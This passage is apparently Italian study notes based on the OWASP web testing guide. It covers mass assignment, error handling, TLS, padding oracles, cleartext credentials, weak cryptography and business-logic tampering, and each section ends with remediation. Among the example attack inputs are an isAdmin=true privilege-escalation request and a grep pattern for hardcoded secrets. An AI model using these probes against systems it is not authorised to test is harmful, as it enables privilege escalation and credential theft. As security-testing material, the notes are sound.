* Alcune proprietà dovrebbero essere impostate solo internamente all'applicazionee

**Come testarlo**
*Esempio*
Ho un oggetto user simile al seguente:

    public class User {
    private String username;
    private String password;
    private String email;
    private boolean isAdmin;

    //Getters & Setters
    }

Per creare un user nuovo, l'applicazione implementa questa vista:

    <form action="/createUser" method="POST">
        <input name="username" type="text">
        <input name="password" type="text">
        <input name="email" type="text">
        <input type="submit" value="Create">
    </form>

Il controller gestisce la richiesta così:

    @RequestMapping(value = "/createUser", method = RequestMethod.POST)
    public String createUser(User user) {
    userService.add(user);
    return "successPage";
    }

Quando il modulo viene inviato, la seguente richiesta viene generata dal browser:

    POST /createUser
    [...]
    username=bob&password=supersecretpassword&email=bob@domain.test

Tuttavia, a causa dell'autobinding, un attaccante può aggiungere il parametro isAdmin alla richiesta, che il controller assocerà automaticamente al modello.

    POST /createUser
    [...]
    username=bob&password=supersecretpassword&email=bob@domain.test&isAdmin=true

L'utente viene quindi creato con la proprietà isAdmin impostata su true, conferendogli diritti amministrativi sull'applicazione.

**Black box**
Per determinare quale parte dell'applicazione è vulnerabile a Mass Assignment, elenca tutte le parti dell'applicazione che accettano contenuti dall'utente e possono essere mappate a un modello. Ciò include tutte le richieste HTTP (probabilmente GET, POST e PUT) che sembrano consentire operazioni di creazione o aggiornamento sul backend. Uno degli indicatori più semplici per potenziali assegnazioni di massa è la presenza della sintassi con parentesi nei nomi dei parametri di input, come ad esempio:

    <input name="user[name]" type="text">

Quando si incontrano tali schemi, prova ad aggiungere un input relativo a un attributo non esistente (es. user[nonexistingattribute]) e analizza la risposta/comportamento. Se l'applicazione non implementa alcun controllo (es. elenco di campi consentiti), è probabile che risponda con un errore (es. 500) a causa del fatto che non trova l'attributo associato all'oggetto. Più interessante, quegli errori facilitano talvolta la scoperta dei nomi degli attributi e dei tipi di dati necessari per sfruttare il problema, senza accesso al codice sorgente.

*Identifica campi sensibili*
Poiché nel testing black-box il tester non ha visibilità sul codice sorgente, è necessario trovare altri modi per raccogliere informazioni sugli attributi associati agli oggetti. Analizza le risposte ricevute dal backend, prestando particolare attenzione a:
* Codice sorgente della pagina HTML
* Codice JavaScript personalizzato
* Risposte API

Ad esempio, molto spesso è possibile sfruttare gestori che restituiscono dettagli su un oggetto per raccogliere indizi sui campi associati. Supponiamo ad esempio di avere un gestore che restituisce il profilo dell'utente (es. GET /profile), questo potrebbe includere ulteriori attributi relativi all'utente (in questo esempio l'attributo isAdmin sembra particolarmente interessante).

    {"_id":12345,"username":"bob","age":38,"email":"bob@domain.test","isAdmin":false}

Quindi prova a sfruttare gestori che consentono la modifica o creazione di utenti, aggiungendo l'attributo isAdmin configurato su true.

Un altro approccio è utilizzare wordlists per provare a enumerare tutti i potenziali attributi. L'enumerazione può essere automatizzata (es. tramite wfuzz, Burp Intruder, ZAP fuzzer, ecc.). Lo strumento sqlmap include una wordlist common-columns.txt che può essere utile per identificare potenziali attributi sensibili. Un piccolo esempio di nomi di attributi interessanti comuni è il seguente:
* is_admin
* is_administrator
* isAdmin
* isAdministrator
* admin
* administrator
* role

*Controlla l'impatto*
L'impatto di una mass assignment può variare a seconda del contesto, quindi, per ciascun input di test tentato nella fase precedente, analizza il risultato e determina se rappresenta una vulnerabilità che ha un impatto realistico sulla sicurezza dell'applicazione web. Ad esempio, la modifica dell'id di un oggetto può portare a un Denial of Service dell'applicazione o a un'elevazione dei privilegi. Un altro esempio riguarda la possibilità di modificare il ruolo/stato dell'utente (es. ruolo o isAdmin), portando a un'elevazione verticale dei privilegi.

**Grey box**
Quando l'analisi viene eseguita con un approccio gray-box, è possibile seguire la stessa metodologia per verificare il problema. Tuttavia, la maggiore conoscenza sull'applicazione consente di identificare più facilmente i framework e i gestori soggetti a vulnerabilità di mass assignment. 

Quando l'analisi viene eseguita con un approccio gray-box, è possibile seguire la stessa metodologia per verificare il problema. Tuttavia, la maggiore conoscenza sull'applicazione consente di identificare più facilmente i framework e i gestori soggetti a vulnerabilità di mass assignment. In particolare, quando il codice sorgente è disponibile, è possibile cercare più facilmente e con precisione i vettori di input. Durante una revisione del codice sorgente, utilizza strumenti semplici (come il comando grep) per cercare uno o più schemi comuni all'interno del codice dell'applicazione. L'accesso allo schema DB o al codice sorgente consente anche di identificare facilmente i campi sensibili.

*Java*
Spring MVC consente di associare automaticamente l'input dell'utente a un oggetto. Identifica i controller che gestiscono richieste che modificano lo stato (es. trova le occorrenze di @RequestMapping) e verifica se sono presenti controlli (sia sul controller che sui modelli coinvolti). Le limitazioni all'exploitation della mass assignment possono essere, ad esempio, sotto forma di:
* elenco di campi assegnabili tramite il metodo setAllowedFields della classe DataBinder (es. `binder.setAllowedFields(["username","password","email"])`)
* elenco di campi non assegnabili tramite il metodo setDisallowedFields della classe DataBinder (es. `binder.setDisallowedFields(["isAdmin"])`)

È inoltre consigliabile prestare attenzione all'uso dell'annotazione `@ModelAttribute`, che consente di specificare un nome/chiave diversa.

*PHP*
Laravel Eloquent ORM fornisce un metodo create che consente l'assegnazione automatica degli attributi. Tuttavia, le ultime versioni di Eloquent ORM forniscono protezione predefinita contro le vulnerabilità di mass assignment richiedendo di specificare esplicitamente gli attributi consentiti che possono essere assegnati automaticamente, attraverso l'array $fillable, o gli attributi da proteggere (non assegnabili), tramite l'array $guarded. Analizzando i modelli (classi che estendono la classe Model), è possibile identificare quali attributi sono consentiti o negati e quindi segnalare potenziali vulnerabilità.

*.NET*
Il binding dei modelli in ASP.NET associa automaticamente gli input dell'utente alle proprietà degli oggetti. Questo funziona anche con tipi complessi e convertirà automaticamente i dati di input nelle proprietà se i nomi delle proprietà corrispondono a quelli di input. Identifica i controller e verifica se sono presenti controlli (sia all'interno del controller che nei modelli coinvolti). Le limitazioni all'exploitation della mass assignment possono essere, ad esempio, sotto forma di:
* campi dichiarati come ReadOnly
* elenco di campi assegnabili tramite l'attributo Bind (es. [Bind(Include = "FirstName, LastName")] Student std), tramite includeProperties (es. includeProperties: new[] { "FirstName, LastName" }) o tramite TryUpdateModel
* elenco di campi non assegnabili tramite l'attributo Bind (es. [Bind(Exclude = "Status")] Student std) o tramite excludeProperties (es. excludeProperties: new[] { "Status" })

**Rimedi**
Utilizza le funzionalità integrate, fornite dai framework, per definire campi assegnabili e non assegnabili. Un approccio basato su campi consentiti (assegnabili), in cui vengono definiti esplicitamente solo le proprietà che dovrebbero essere aggiornate dall'utente, è preferibile. Un approccio architetturale per prevenire il problema è utilizzare il pattern Data Transfer Object (DTO) per evitare il binding diretto. Il DTO dovrebbe includere solo i campi che devono essere modificabili dall'utente.

### H - Test sulla gestione dell'errore
#### 1 - Test per la gestione errata dell'errore
Gli sviluppatori spesso ignorano la gestione di questi errori o sottovalutano l’idea che un utente possa provare a generare un errore intenzionalmente (ad esempio, inviando una stringa quando è atteso un intero). Quando gli sviluppatori considerano solo il percorso "felice", dimenticano tutti gli altri possibili input che il codice può ricevere ma non può gestire.

Gli errori possono manifestarsi come:
* stack trace
* timeout di rete
* mismatch di input
* dump di memoria

Una gestione errata degli errori può consentire agli attaccanti di:
* Comprendere le API utilizzate internamente.
* Mappare i vari servizi che si integrano tra loro, guadagnando informazioni sui sistemi e framework interni utilizzati, aprendo la strada a una catena di attacchi.
* Raccogliere versioni e tipi di applicazioni in uso.
* Eseguire un attacco DoS sul sistema costringendolo a un deadlock o a un’eccezione non gestita che invia un segnale di panico al motore che lo gestisce.
* Effettuare bypass di controlli dove una certa eccezione non è limitata dalla logica impostata attorno al percorso "felice".

**Come testarlo**
Gli errori sono solitamente visti come benigni poiché forniscono dati diagnostici e messaggi che possono aiutare l'utente a comprendere il problema o gli sviluppatori a debuggare l'errore.
Provando a inviare dati imprevisti o costringendo il sistema in determinati casi limite e scenari, il sistema o l'applicazione mostreranno, nella maggior parte dei casi, qualcosa su ciò che sta accadendo internamente, a meno che gli sviluppatori non abbiano disattivato tutti gli errori possibili restituendo un certo messaggio personalizzato.

Per attivare i messaggi di errore, un tester deve:
* Cercare file e cartelle casuali che non verranno trovati (404).
* Provare a richiedere cartelle esistenti e osservare il comportamento del server (403, pagina vuota o elenco directory).
* Provare a inviare una richiesta che infrange l’RFC HTTP. Un esempio sarebbe inviare un percorso molto lungo, rompere il formato degli header o cambiare la versione HTTP.

Fare questo lavoro con le applicazioni è più lungo dato che queste sono personalizzate per ogni utente.

**Rimedi**
* Fornire messaggi di errore generali agli utenti finali, evitando dettagli tecnici o informazioni sensibili che potrebbero essere sfruttate da un attaccante.
* Registrare dettagli degli errori in log sicuri per l’analisi da parte degli sviluppatori. È importante non includere dati sensibili nei log, ma mantenere informazioni utili per il debugging.

Per i rimedi consultare il [Proactive Controls C10](https://owasp.org/www-project-proactive-controls/v3/en/c10-errors-exceptions) e l'[Error Handling Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Error_Handling_Cheat_Sheet.html).

### I - Test per una crittografia debole
#### 1 - Test per una sicurezza inadeguata nel TLS (Transport Layer Security)
Quando le informazioni vengono inviate tra il client e il server, devono essere criptate e protette per evitare che un attaccante possa leggerle o modificarle. Questo viene comunemente fatto utilizzando HTTPS. Il TLS fornisce anche un modo per il server di dimostrare al client di essersi connesso al server corretto, presentando un certificato digitale affidabile.

Nel corso degli anni, sono state identificate numerose vulnerabilità crittografiche nei protocolli SSL e TLS, così come nei cifrari che utilizzano. Inoltre, molte implementazioni di questi protocolli hanno presentato gravi vulnerabilità. Pertanto, è importante testare che i siti non solo implementino TLS, ma che lo facciano in modo sicuro.

**Come testarlo**
*Se volete esempi di come funzionano i test guaradate [il sito](https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/01-Testing_for_Weak_Transport_Layer_Security.md) (è una lista di cose che potrebbero andare male nel setup), altrimenti qua mette degli strumenti statici che dovrebbero fare il lavoro al posto vostro.*

**Test Automatizzati**
Esistono numerosi strumenti di scansione che possono essere utilizzati per identificare vulnerabilità nella configurazione SSL/TLS di un servizio, compresi strumenti dedicati e scanner di vulnerabilità generali. Alcuni dei più popolari sono:
- Nmap (vari script)
- OWASP O-Saft
- sslscan
- sslyze
- SSL Labs
- testssl.sh

**Rimedi**
* Assicurarsi di non supportare SSLv2, SSLv3 e TLS 1.0, poiché sono vulnerabili. Utilizzare solo cifrari considerati sicuri e aggiornati, evitando quelli deprecati o vulnerabili come RC4 o 3DES.
* Configurare HSTS per forzare l'uso di HTTPS e prevenire attacchi di downgrade.

#### 2 - Testing for Padding Oracle

*Traduzione completa perché non capisco* 

Un padding oracle è una funzione di un'applicazione che decripta i dati crittografati forniti dal client.L'esistenza di un padding oracle consente a un attaccante di decriptare dati crittografati e crittografare dati arbitrari senza conoscere la chiave utilizzata per queste operazioni crittografiche. 

I cifrari a blocchi crittografano i dati solo in blocchi di dimensioni specifiche. Le dimensioni dei blocchi utilizzati dai cifrari comuni sono 8 e 16 byte. I dati la cui dimensione non corrisponde a un multiplo della dimensione del blocco del cifrario utilizzato devono essere riempiti in un modo specifico affinché il decrittore possa rimuovere il padding. Uno schema di padding comunemente utilizzato è PKCS#7, che riempie i byte rimanenti con il valore della lunghezza del padding.

*Esempio 1*
Se il padding ha una lunghezza di 5 byte, il valore del byte 0x05 viene ripetuto cinque volte dopo il testo in chiaro.

Una condizione di errore è presente se il padding non corrisponde alla sintassi dello schema di padding utilizzato. Un padding oracle è presente se un'applicazione rivela questa specifica condizione di errore di padding per i dati crittografati forniti dal client. Questo può avvenire esponendo eccezioni (ad esempio, BadPaddingException in Java) direttamente, mediante differenze sottili nelle risposte inviate al client o tramite un altro canale laterale come il comportamento temporale.

Alcuni modi di operazione della crittografia consentono attacchi di bit-flipping, in cui il cambio di un bit nel testo cifrato causa anche il cambio di quel bit nel testo in chiaro. Cambiare un bit nel n-esimo blocco di dati crittografati con CBC fa sì che lo stesso bit nel (n+1)-esimo blocco venga invertito nei dati decrittati. Il n-esimo blocco del testo cifrato decrittato viene rovinato da questa manipolazione.

L'attacco del padding oracle consente a un attaccante di decriptare dati crittografati senza conoscere la chiave di crittografia e il cifrario utilizzati, inviando testi cifrati manipolati con abilità al padding oracle e osservando i risultati restituiti. Questo provoca la perdita di riservatezza dei dati crittografati. Ad esempio, nel caso di dati di sessione memorizzati sul lato client, l'attaccante può ottenere informazioni sullo stato interno e sulla struttura dell'applicazione.

Un attacco di padding oracle consente anche a un attaccante di crittografare testi in chiaro arbitrari senza conoscere la chiave e il cifrario utilizzati. Se l'applicazione assume che l'integrità e l'autenticità dei dati decrittati siano garantite, un attaccante potrebbe essere in grado di manipolare lo stato interno della sessione e possibilmente ottenere privilegi più elevati.

**Come testarlo**
**Black box**
Inizialmente, devono essere identificati i possibili punti di input per i padding oracle. In generale, devono essere soddisfatte le seguenti condizioni:
* I dati sono crittografati. Buoni candidati sono valori che sembrano casuali.
* Viene utilizzato un cifrario a blocchi. La lunghezza del testo cifrato (spesso codificato in Base64) è un multiplo delle dimensioni comuni dei blocchi, come 8 o 16 byte. Testi cifrati diversi (ad esempio, raccolti in diverse sessioni o manipolando lo stato della sessione) condividono un divisore comune nella lunghezza.

*Esempio 2*
`Dg6W8OiWMIdVokIDH15T/A==` dopo la decodifica in base64, risulta in `0e 0e 96 f0 e8 96 30 87 55 a2 42 03 1f 5e 53 fc`. Questo sembra casuale e ha una lunghezza di 16 byte.

Se viene identificato un tale candidato di valore di input, deve essere verificato il comportamento dell'applicazione in caso di manomissione bit-wise del valore crittografato. Normalmente, questo valore codificato in base64 includerà il vettore di inizializzazione (IV) preceduto al testo cifrato. Dato un testo in chiaro `p` e un cifrario con una dimensione di blocco `n`, il numero di blocchi sarà `b = ceil(length(p) / n)`. La lunghezza della stringa crittografata sarà `y=(b+1)n` a causa del vettore di inizializzazione. Per verificare la presenza dell'oracle, decodifica la stringa, cambia l'ultimo bit del penultimo blocco `b-1` (il bit meno significativo del byte a `y-n-1`), ricodifica e invia. Successivamente, decodifica la stringa originale, cambia l'ultimo bit del blocco `b-2` (il bit meno significativo del byte a `y-2n-1`), ricodifica e invia.

Se si sa che la stringa crittografata è un singolo blocco (l'IV è memorizzato sul server o l'applicazione utilizza una cattiva pratica con un IV hardcoded), devono essere eseguiti diversi flip di bit a turno. Un approccio alternativo potrebbe essere quello di aggiungere un blocco casuale e cambiare i bit per far assumere all'ultimo byte del blocco aggiunto tutti i possibili valori (da 0 a 255).

I test e il valore base dovrebbero almeno causare tre stati diversi durante e dopo la decrittazione:

* Il testo cifrato viene decriptato, i dati risultanti sono corretti.
* Il testo cifrato viene decriptato, i dati risultanti sono illeggibili e causano qualche eccezione o gestione degli errori nella logica dell'applicazione.
* La decrittazione del testo cifrato fallisce a causa di errori di padding.

Confronta attentamente le risposte. Cerca soprattutto eccezioni e messaggi che indicano che qualcosa non va con il padding. Se appaiono messaggi di questo tipo, l'applicazione contiene un padding oracle. Se i tre stati diversi descritti sopra sono osservabili implicitamente (messaggi di errore diversi, canali laterali temporali), c'è un'alta probabilità che sia presente un padding oracle in questo punto. Prova a eseguire l'attacco del padding oracle per confermarlo.

*Esempio 3*
* ASP.NET genera l'eccezione `System.Security.Cryptography.CryptographicException: Padding is invalid and cannot be removed.`, se il padding di un testo cifrato decrittato è danneggiato.
* In Java viene generata una `javax.crypto.BadPaddingException` in questo caso.
* Gli errori di decrittazione o simili possono essere potenziali padding oracle.

Un'implementazione sicura verificherà l'integrità e genererà solo due risposte: ok e fallito. Non ci sono canali laterali che possono essere utilizzati per determinare stati di errore interni.

**Grey box**
Verifica che in tutti i luoghi in cui i dati crittografati provengono dal client, che dovrebbero essere conosciuti solo dal server, vengano decrittati. Le seguenti condizioni dovrebbero essere soddisfatte da tale codice:

* L'integrità del testo cifrato dovrebbe essere verificata da un meccanismo sicuro, come HMAC o modalità di operazione di cifratura autenticata come GCM o CCM.
* Tutti gli stati di errore durante la decrittazione e l'elaborazione successiva sono gestiti uniformemente.

**Rimedi**
* Utilizzare modalità di cifratura che integrano l'autenticazione, come GCM (Galois/Counter Mode) o CCM (Counter with CBC-MAC). Queste modalità garantiscono che i dati siano sia crittografati che autenticati, riducendo il rischio di errori di padding.
* Implementare una gestione degli errori che fornisca risposte uniformi per tutti i tipi di errore, senza rivelare dettagli specifici sull'errore di padding. Ad esempio, restituire sempre un messaggio generico come "Errore di decrittazione" senza indicare se il problema è legato al padding o a un'altra causa.
* Utilizzare un codice di autenticazione del messaggio (HMAC) per garantire che i dati non siano stati manomessi. Prima di decrittare, verificare l'HMAC del messaggio per assicurarsi che sia autentico.

#### 3 - Test per informazioni sensibili inviate in canali non criptati
Come regola generale, se i dati devono essere protetti quando sono memorizzati, devono anche essere protetti durante la trasmissione. 

**Come testarlo**
Per verificare se queste informazioni vengono trasmesse su HTTP invece che su HTTPS, cattura il traffico tra un client e il server dell'applicazione web che necessita di credenziali. Per ogni messaggio contenente dati sensibili, verifica che lo scambio sia avvenuto utilizzando HTTPS.

*Autenticazione di base su HTTP*
Nell'esempio seguente, il tester utilizza curl per testare se le credenziali sono solo codificate invece che cifrate.In questo caso l'applicazione utilizza l'autenticazione di base HTTP invece che HTTPS.

    $ curl -kis http://example.com/restricted/
    HTTP/1.1 401 Authorization Required
    Date: Fri, 01 Aug 2013 00:00:00 GMT
    WWW-Authenticate: Basic realm="Restricted Area"
    Accept-Ranges: bytes Vary:
    Accept-Encoding Content-Length: 162
    Content-Type: text/html

    <html><head><title>401 Authorization Required</title></head>
    <body bgcolor=white> <h1>401 Authorization Required</h1>  Invalid login credentials!  </body></html>

Se fosse HTTPS ci sarebbe un protocollo di handshake e le intestazioni HTTP non sarebbero mostrate in chiaro.

*Esempio 2*
Un altro esempio tipico sono i moduli di autenticazione che trasmettono le credenziali di autenticazione degli utenti su HTTP. Nell'esempio seguente, si può vedere l'uso di HTTP nell'attributo action del modulo.

    <form action="http://example.com/login">
        <label for="username">Utente:</label> <input type="text" id="username" name="username" value=""/><br />
        <label for="password">Password:</label> <input type="password" id="password" name="password" value=""/>
        <input type="submit" value="Login"/>
    </form>

*Esempio 3*
Il cookie contenente l'ID della sessione deve essere trasmesso attraverso canali protetti. Se il cookie non ha il flag di sicurezza impostato, l'applicazione può trasmetterlo in chiaro. Nota che qui il cookie è impostato senza il flag `Secure`, e l'intero processo di login è eseguito in HTTP e non in HTTPS.

    https://secure.example.com/login

    POST /login HTTP/1.1
    Host: secure.example.com
    [...]
    Referer: https://secure.example.com/
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 188

    HTTP/1.1 302 Found
    Date: Tue, 03 Dec 2013 21:18:55 GMT
    Server: Apache
    Set-Cookie: JSESSIONID=BD99F321233AF69593EDF52B123B5BDA; expires=Fri, 01-Jan-2014 00:00:00 GMT; path=/; domain=example.com; httponly  <-- QUI MANCA SECURE
    Location: private/
    Content-Length: 0
    Content-Type: text/html

<br>

    http://example.com/private

    GET /private HTTP/1.1
    Host: example.com
    [...]
    Referer: https://secure.example.com/login
    Cookie: JSESSIONID=BD99F321233AF69593EDF52B123B5BDA;

    HTTP/1.1 200 OK
    Content-Type: text/html;charset=UTF-8
    Content-Length: 730
    Date: Tue, 25 Dec 2013 00:00:00 GMT

*Esempio 4*
Se l'applicazione web ha funzionalità che consentono a un utente di modificare un account o di chiamare un altro servizio con le credenziali, verifica che tutte queste interazioni utilizzino HTTPS; per esempio la reimpostazione di una password, transazioni economiche, ecc...

*Esempio 5*
Controlla di aver tolto informazioni sensibili dal codice sorgente e dai log.
Utilizza una delle seguenti tecniche per cercare informazioni sensibili.

Verifica se la password o la chiave di crittografia è hardcoded nel codice sorgente o nei file di configurazione.

    grep -r -E "Pass | password | pwd | user | guest | admin | encry | key | decrypt | sharekey" ./PathToSearch/

Verifica se i log o il codice sorgente possono contenere numeri di telefono, indirizzi email, ID o qualsiasi altra informazione personale identificabile (PII). Cambia l'espressione regolare in base al formato della PII.

    grep -r " {2\}[0-9]\{6\} " ./PathToSearch/

**Rimedio**
* Utilizza HTTPS per tutto il sito e reindirizza le richieste HTTP in HTTPS.

#### 4 - Test per crittografia debole
**Come testarlo**
*Checklist della sicurezza di base*
* Quando si utilizza AES128 o AES256, l'IV (Initialization Vector) deve essere casuale e imprevedibile. Fare riferimento a [FIPS 140-2, Requisiti di Sicurezza per i Moduli Crittografici](https://csrc.nist.gov/publications/detail/fips/140/2/final), sezione 4.9.1, test dei generatori di numeri casuali. Ad esempio, in Java, java.util.Random è considerato un generatore di numeri casuali debole. Utilizzare java.security.SecureRandom al posto di java.util.Random.
* Per la crittografia asimmetrica, utilizzare la Crittografia a Curva Ellittica (ECC) con una curva sicura come Curve25519.
Se non è possibile utilizzare ECC, utilizzare la crittografia RSA con una chiave minima di 2048 bit.
* Quando si utilizza RSA per le firme, si raccomanda il padding PSS.
* Non utilizzare algoritmi di hash/critografia deboli come MD5, RC4, DES, Blowfish, SHA1, RSA o DSA a 1024 bit, ECDSA (curve ellittiche) a 160 bit, 2TDEA (triple DES a due chiavi) a 80/112 bit.
* Requisiti minimi per la lunghezza delle chiavi:

        Key exchange: Diffie–Hellman key exchange with minimum 2048 bits
        Message Integrity: HMAC-SHA2
        Message Hash: SHA2 256 bits
        Asymmetric encryption: RSA 2048 bits
        Symmetric-key algorithm: AES 128 bits
        Password Hashing: PBKDF2, Scrypt, Bcrypt
        ECDH, ECDSA: 256 bits

* L'uso di SSH con modalità CBC non è consigliato.
* Quando si utilizza un algoritmo di crittografia simmetrica, la modalità ECB (Electronic Code Book) non deve essere utilizzata.
* Quando si utilizza PBKDF2 per l'hashing delle password, si consiglia un parametro di iterazione superiore a 10.000. NIST suggerisce almeno 10.000 iterazioni della funzione di hash. Inoltre, la funzione di hash MD5 è vietata con PBKDF2, come ad esempio PBKDF2WithHmacMD5.

*Revisione del codice sorgente*
* Cerca le seguenti parole chiave per identificare l'uso di algoritmi deboli: `MD4, MD5, RC4, RC2, DES, Blowfish, SHA-1, ECB`.
* Per le implementazioni Java, le seguenti API sono correlate alla crittografia. Rivedi i parametri dell'implementazione della crittografia. Ad esempio:

        SecretKeyFactory(SecretKeyFactorySpi keyFacSpi, Provider provider, String algorithm)
        SecretKeySpec(byte[] key, int offset, int len, String algorithm)
        Cipher c = Cipher.getInstance("DES/CBC/PKCS5Padding");
    
* Per la crittografia RSA, sono suggerite le seguenti modalità di padding:

        RSA/ECB/OAEPWithSHA-1AndMGF1Padding (2048)
        RSA/ECB/OAEPWithSHA-256AndMGF1Padding (2048)

* Cerca "ECB", non è consentito utilizzarlo nel padding. 
* Verifica se viene utilizzato un vettore di inizializzazione (IV) diverso.

        // Use a different IV value for every encryption
        byte[] newIv = ...;
        s = new GCMParameterSpec(s.getTLen(), newIv);
        cipher.init(..., s);
        ...

* Cerca "IvParameterSpec", controlla se il valore IV viene generato in modo diverso e casuale.

        IvParameterSpec iv = new IvParameterSpec(randBytes);
        SecretKeySpec skey = new SecretKeySpec(key.getBytes(), "AES");
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(Cipher.ENCRYPT_MODE, skey, iv);

* In Java, cerca "MessageDigest" per verificare se viene utilizzato un algoritmo di hash debole (MD5 o CRC). Ad esempio:

        MessageDigest md5 = MessageDigest.getInstance("MD5");

* Per la firma, non dovrebbero essere utilizzati SHA1 e MD5. Ad esempio:

    Signature sig = Signature.getInstance("SHA1withRSA");

* Cerca "PBKDF2". Per generare il valore hash della password, è consigliato utilizzare PBKDF2. Rivedi i parametri per generare il valore hash di PBKDF2.

    Le iterazioni dovrebbero essere superiori a 10.000 e il valore del sale dovrebbe essere generato come valore casuale.

        private static byte[] pbkdf2(char[] password, byte[] salt, int iterations, int bytes)
            throws NoSuchAlgorithmException, InvalidKeySpecException
        {
            PBEKeySpec spec = new PBEKeySpec(password, salt, iterations, bytes * 8);
            SecretKeyFactory skf = SecretKeyFactory.getInstance(PBKDF2_ALGORITHM);
            return skf.generateSecret(spec).getEncoded();
        }

* Informazioni sensibili codificate in modo fisso:

    User related keywords: name, root, su, sudo, admin, superuser, login, username, uid
    Key related keywords: public key, AK, SK, secret key, private key, passwd, password, pwd, share key, shared key, cryto, base64
    Other common sensitive keywords: sysadmin, root, privilege, pass, key, code, master, admin, uname, session, token, Oauth, privatekey, shared secret

**Strumenti**
* I scanner di vulnerabilità come Nessus, NMAP (script) o OpenVAS possono analizzare l'uso o l'accettazione di crittografia debole rispetto a protocolli come SNMP, TLS, SSH, SMTP, ecc.
* Utilizza strumenti di analisi del codice statico per effettuare revisioni del codice sorgente come Klocwork, Fortify, Coverity, CheckMark per i seguenti casi.

        CWE-261: Weak Cryptography for Passwords
        CWE-323: Reusing a Nonce, Key Pair in Encryption
        CWE-326: Inadequate Encryption Strength
        CWE-327: Use of a Broken or Risky Cryptographic Algorithm
        CWE-328: Reversible One-Way Hash
        CWE-329: Not Using a Random IV with CBC Mode
        CWE-330: Use of Insufficiently Random Values
        CWE-347: Improper Verification of Cryptographic Signature
        CWE-354: Improper Validation of Integrity Check Value
        CWE-547: Use of Hard-coded, Security-relevant Constants
        CWE-780: Use of RSA Algorithm without OAEP

**Rimedi**
* Crittografia Simmetrica: Utilizzare AES (128 o 256 bit) con modalità sicure come GCM o CBC con un IV casuale e unico per ogni operazione.
* Crittografia Asimmetrica: Preferire ECC (Curve25519) per la crittografia asimmetrica. Se non è possibile, usare RSA con una lunghezza di chiave minima di 2048 bit e padding OAEP.
* Non utilizzare algoritmi di hashing o crittografia considerati obsoleti o vulnerabili come MD5, SHA1, DES, Blowfish, o RC4.
* Assicurarsi di non utilizzare la modalità ECB per gli algoritmi simmetrici.
* Utilizzare librerie sicure come java.security.SecureRandom per generare chiavi e IV, assicurandosi che siano sempre casuali e unici per ogni sessione di crittografia.
* Utilizzare metodi di hashing sicuri come PBKDF2, bcrypt o scrypt, con un numero di iterazioni superiore a 10.000.

### J - Test della logica aziendale
#### 1 - Introduzione alla logica aziendale
Testare i difetti della logica aziendale in un'applicazione web dinamica multi-funzionale richiede di pensare in modi non convenzionali. Se il meccanismo di autenticazione di un'applicazione è sviluppato con l'intenzione di eseguire i passaggi 1, 2, 3 in quest'ordine specifico per autenticare un utente, cosa succede se l'utente passa direttamente dal passaggio 1 al passaggio 3? In questo esempio semplificato, l'applicazione fornisce accesso fallendo in modo aperto, nega l'accesso o genera semplicemente un errore con un messaggio 500?
Questi tipi di test richiedono che i professionisti della sicurezza pensino in modo diverso, sviluppino casi di abuso e uso improprio e utilizzino molte delle tecniche di testing adottate dai tester funzionali.

Gli strumenti automatici faticano a comprendere il contesto, quindi spetta a una persona eseguire questi tipi di test.

#### 2 - Test di validazione della logica aziendale
L'applicazione deve garantire che solo dati logicamente validi possano essere inseriti sia nel frontend che direttamente nel lato server di un'applicazione o sistema. 
Verificare i dati solo sul client/frontend può lasciare le applicazioni vulnerabili a iniezioni server attraverso proxy o nei passaggi con altri sistemi.

**Come testarlo**
*Metodo di Test Generico*
* Utilizzare test esplorativi alla ricerca di punti di inserimento dati o punti di passaggio tra sistemi o software
* Cercare di inserire dati illogici nell'applicazione/sistema
* Eseguire test di validazione funzionale GUI sul frontend dell'applicazione per garantire che siano accettati solo valori "validi".
* Utilizzando un proxy di intercettazione, osservare le richieste HTTP POST/GET cercando luoghi in cui variabili come costo e qualità vengono passate. In particolare, cercare "passaggi" tra applicazioni/sistemi che potrebbero essere punti di iniezione o manomissione.
* Una volta trovate le variabili, iniziare a interrogarle con dati "logicamente invalidi", come numeri di previdenza sociale o identificatori unici che non esistono o che non si adattano alla logica aziendale. Questo test verifica che il server funzioni correttamente e non accetti dati logicamente invalidi.

#### 3 - Testare l'abilità nel forgiare richieste
L'obiettivo dell'attaccante è inviare richieste HTTP POST/GET attraverso un proxy di intercettazione con valori di dati non supportati, non protetti o non previsti dalla logica aziendale dell'applicazione.

*Esempio 1*
Supponiamo che un sito di e-commerce per il teatro consenta agli utenti di selezionare il proprio biglietto, applicare uno sconto per anziani del 10% su tutta la vendita, visualizzare il subtotale e concludere la vendita. Se un attaccante è in grado di vedere attraverso un proxy che l'applicazione ha un campo nascosto (di 1 o 0) utilizzato dalla logica aziendale per determinare se uno sconto è già stato applicato o meno, l'attaccante può quindi inviare più volte il valore 1 o "non è stato applicato alcuno sconto" per approfittare dello stesso sconto più volte.

#### 4 - Controlli di integrità dei test
Molte applicazioni sono progettate per visualizzare campi diversi a seconda dell'utente o della situazione, mantenendo alcuni input nascosti. Tuttavia, in molti casi è possibile inviare valori di campi nascosti al server utilizzando un proxy. In questi casi, i controlli lato server devono essere abbastanza intelligenti da eseguire modifiche relazionali o server-side per garantire che i dati appropriati siano consentiti al server in base alla logica aziendale specifica dell'utente e dell'applicazione.
Inoltre, l'applicazione non deve dipendere da controlli non modificabili, menu a discesa o campi nascosti per l'elaborazione della logica aziendale, poiché questi campi rimangono non modificabili solo nel contesto dei browser. Gli utenti potrebbero essere in grado di modificare i loro valori utilizzando strumenti di modifica proxy e tentare di manipolare la logica aziendale.

*Esempio*
Immagina un'applicazione GUI ASP.NET che consente solo all'utente admin di cambiare la password per altri utenti nel sistema. L'utente admin vedrà i campi username e password per inserire un nome utente e una password, mentre gli altri utenti non vedranno nessuno dei due campi. Tuttavia, se un utente non admin invia informazioni nei campi username e password tramite un proxy, potrebbe essere in grado di "ingannare" il server facendogli credere che la richiesta provenga da un utente admin e cambiare la password di altri utenti.

**Come testarlo**
*Metodo 1*
* Utilizzare un proxy per catturare il traffico HTTP alla ricerca di campi nascosti o di un luogo dove inserire informazioni in aree dell'applicazione che non sono modificabili.
* Se viene trovato un campo nascosto, vedere come questi campi si confrontano con l'applicazione GUI e iniziare a interrogare questo valore tramite il proxy inviando diversi valori di dati cercando di eludere il processo aziendale e manipolare valori ai quali non si dovrebbe avere accesso.

*Metodo 2*
